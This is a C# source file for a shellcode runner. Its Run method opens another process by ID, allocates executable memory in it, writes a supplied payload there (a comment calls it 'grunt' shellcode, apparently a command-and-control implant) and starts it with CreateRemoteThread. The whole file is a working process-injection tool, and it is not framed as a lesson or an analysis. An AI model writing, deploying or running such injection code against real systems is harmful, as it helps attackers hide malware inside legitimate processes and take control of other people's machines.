using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Collections.Generic;
namespace Runner
{
  class Simple
  {
    public static IntPtr Run(byte[] sc, int pid, bool isSelf)
    {
      // Find the target process
      Process target = Process.GetProcessById(pid);

      // Get a handle to the target process
      var hProcess = Win32.OpenProcess(
          Win32.ProcessAccessFlags.All,
          false,
          target.Id
      );

      if (hProcess != IntPtr.Zero)
        Console.WriteLine("[>] Got handle to {0}", target.ProcessName);

      // Allocate region of memory in the target process
      var memoryAddress = Win32.VirtualAllocEx(
          hProcess,
          IntPtr.Zero,
          (uint)sc.Length,
          Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
          Win32.MemoryProtection.ExecuteReadWrite
      );

      if (memoryAddress != IntPtr.Zero)
        Console.WriteLine("[>] Allocated memory region");

      // Copy grunt shellcode to target process
      UIntPtr bytesWritten;
      var scWritten = Win32.WriteProcessMemory(
          hProcess,
          memoryAddress,
          sc,
          (uint)sc.Length,
          out bytesWritten
      );

      if (scWritten)
        Console.WriteLine("[>] SC written");

      IntPtr threadId;
      var hThread = Win32.CreateRemoteThread(
          hProcess,
          IntPtr.Zero,
          0,
          memoryAddress,
          IntPtr.Zero,
          0,
          out threadId
      );

      if (hThread != IntPtr.Zero)
        Console.WriteLine("[>] Remote Thread started");
      if (isSelf) {
        Console.WriteLine("[>] Waiting Forever");
        while (true) {
          Thread.Sleep(1000);
        }
      }
      Console.WriteLine("[>] Done!");
      return hProcess;
    }
  }
}